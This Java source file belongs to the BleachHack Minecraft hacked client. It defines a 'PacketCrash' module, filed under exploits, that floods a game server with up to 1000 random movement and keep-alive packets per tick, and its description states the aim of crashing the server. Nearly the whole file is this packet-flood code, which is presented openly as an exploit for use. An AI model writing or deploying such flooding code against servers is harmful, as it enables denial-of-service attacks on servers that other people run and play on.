/*
 * This file is part of the BleachHack distribution (https://github.com/BleachDrinker420/bleachhack-1.14/).
 * Copyright (c) 2019 Bleach.
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package bleach.hack.module.mods;

import com.google.common.eventbus.Subscribe;

import bleach.hack.event.events.EventTick;
import bleach.hack.gui.clickgui.SettingSlider;
import bleach.hack.module.Category;
import bleach.hack.module.Module;
import net.minecraft.server.network.packet.KeepAliveC2SPacket;
import net.minecraft.server.network.packet.PlayerMoveC2SPacket;

public class PlayerCrash extends Module {

	public PlayerCrash() {
        super("PacketCrash", KEY_UNBOUND, Category.EXPLOITS, "Uses cpacketplayer packets to packetify the server so it packets your packet and packs enough to crash",
                new SettingSlider("Uses: ", 1,1000,100,0));
    }
	
	@Subscribe
	public void onTick(EventTick event) {
		for (int i = 0; i < getSettings().get(0).toSlider().getValue(); i++) {
			mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket(Math.random() >= 0.5));
			mc.player.networkHandler.sendPacket(new KeepAliveC2SPacket((int) (Math.random() * 8)));
		}
	}

}
